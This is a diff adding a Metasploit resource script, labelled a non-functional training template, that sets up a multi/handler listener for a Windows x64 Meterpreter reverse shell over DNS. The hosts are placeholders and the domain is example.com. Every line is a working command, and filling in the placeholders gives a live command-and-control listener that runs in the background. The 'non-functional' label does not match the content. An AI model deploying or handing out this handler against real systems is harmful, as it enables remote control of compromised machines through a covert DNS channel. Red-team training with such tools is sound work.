@@ -1,0 +1,9 @@
+# DNS Handler Template
+# For Training Use – Non-functional Template
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_dns
+set LHOST <LHOST>
+set DNSHOST <DNS_HOST>
+set DOMAIN example.com
+exploit -j
